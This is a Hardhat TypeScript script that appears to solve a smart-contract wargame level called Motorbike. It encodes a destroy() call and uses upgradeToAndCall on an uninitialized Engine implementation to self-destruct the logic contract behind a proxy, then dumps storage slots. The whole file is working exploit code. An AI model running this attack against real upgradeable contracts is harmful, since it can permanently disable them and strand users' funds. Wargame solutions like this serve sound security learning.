// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners()
  const PROXY_ADDRESS = "0xb737dC1661b37Ebc7D3a4EA0868b6335e61C1119"
  const IMPLEMENTATION_ADDRESS = "0x645341f83bD62f6cA0859Bc173F1288AB7CF2809"

  const engine = await ethers.getContractAt("Engine", PROXY_ADDRESS)
  const motorbike = await ethers.getContractAt("Motorbike", PROXY_ADDRESS)
  const engineImplementation = await ethers.getContractAt("Engine", IMPLEMENTATION_ADDRESS)

  // deploy self desctruct
  const SelfDestruct = await ethers.getContractFactory("SelfDestruct")
  const selfDestruct = await SelfDestruct.deploy()
  selfDestruct.deployed()

  const printStorage = async (address: string) => {
    const slot1 = await ethers.provider.getStorageAt(address, 0)
    const slot2 = await ethers.provider.getStorageAt(address, 1)
    const slot3 = await ethers.provider.getStorageAt(address, 2)
    const slot4 = await ethers.provider.getStorageAt(address, 3)
    // const slot5 = await ethers.provider.getStorageAt(address, 4)
    // const slot6 = await ethers.provider.getStorageAt(address, 5)


    console.log(slot1)
    console.log(slot2)
    console.log(slot3)
    console.log(slot4)
    // console.log(slot5)
    // console.log(slot6)
    console.log("\n============\n")
  }

  // init engine
  // const initEngineTx = await engineImplementation.initialize()
  // await initEngineTx.wait(2)
  // console.log("SUCCESS INIT ENGINE")

  // upgrade and call self destruct
  const iface = new ethers.utils.Interface(["function destroy()",])

  const payload = iface.encodeFunctionData("destroy", [])
  const attackTx = await engineImplementation.upgradeToAndCall(selfDestruct.address, payload)
  attackTx.wait(2)
  console.log("success self destruct")


  await printStorage(PROXY_ADDRESS)
  await printStorage(IMPLEMENTATION_ADDRESS)

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
